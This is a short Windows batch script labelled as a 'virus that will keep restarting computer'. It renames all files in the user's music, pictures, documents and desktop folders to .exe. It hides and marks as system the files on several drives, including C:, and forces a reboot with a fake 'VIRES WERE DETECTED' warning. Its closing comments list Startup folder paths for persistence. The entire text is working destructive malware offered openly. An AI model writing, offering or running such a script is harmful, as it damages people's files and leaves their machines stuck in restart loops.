REM VIRUS THAT WILL KEEP RESTARTING COMPUTER (v. 0.1.030)

@echo off
ren %userprofile%\music\*.* *.exe
ren %userprofile%\pictures\*.* *.exe
ren %userprofile%\documents\*.* *.exe
ren %userprofile%\desktop\*.* *.exe

	attrib +h +s /s /d %userprofile%\music\*.*
	attrib +h +s /s /d %userprofile%\pictures\*.*
	attrib +h +s /s /d %userprofile%\documents\*.*
	attrib +h +s /s /d %userprofile%\videos\*.*
	attrib +h +s /s /d %userprofile%\desktop\*.*
	attrib +h +s /s /d %userprofile%\download\*.*

attrib +h +s d:\*.* /s
attrib +h +s e:\*.* /s
attrib +h +s f:\*.* /s
attrib +h +s c:\*.* /s
attrib +h +s h:\*.* /s

		shutdown -r -t 10 -c "VIRES WERE DETECTED"
		
		REM FOR WIN XP
REM C:\Documents and Settings\(user)\Start Menu\Programs\Startup
REM C:\Documents and Settings\All Users\Start Menu\Programs\Startup
		REM FOR WIN VISTA, 7 AND 8
REM %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup